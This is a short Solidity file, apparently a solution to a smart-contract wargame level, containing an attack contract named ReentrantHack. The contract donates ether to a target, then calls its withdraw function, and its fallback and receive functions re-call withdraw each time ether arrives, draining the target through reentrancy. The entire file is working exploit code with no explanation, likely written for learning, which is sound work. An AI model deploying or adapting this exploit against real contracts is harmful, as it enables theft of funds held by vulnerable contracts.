// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrant {
    function withdraw(uint _amount) external payable ;
    function donate(address _to) external payable ;
}

contract ReentrantHack {
    Reentrant reentrant_contract;
    uint public balance;
    constructor(address _reentrant_contract) payable{
        reentrant_contract = Reentrant(_reentrant_contract);
        balance = msg.value;
    }

    function donate() public payable{
        reentrant_contract.donate{value: balance}(address(this));
    }

    function withdraw() public payable {
        reentrant_contract.withdraw(balance);
    }

    fallback() external payable {
        withdraw();
    }

    receive() external payable {
        withdraw();
    }

}
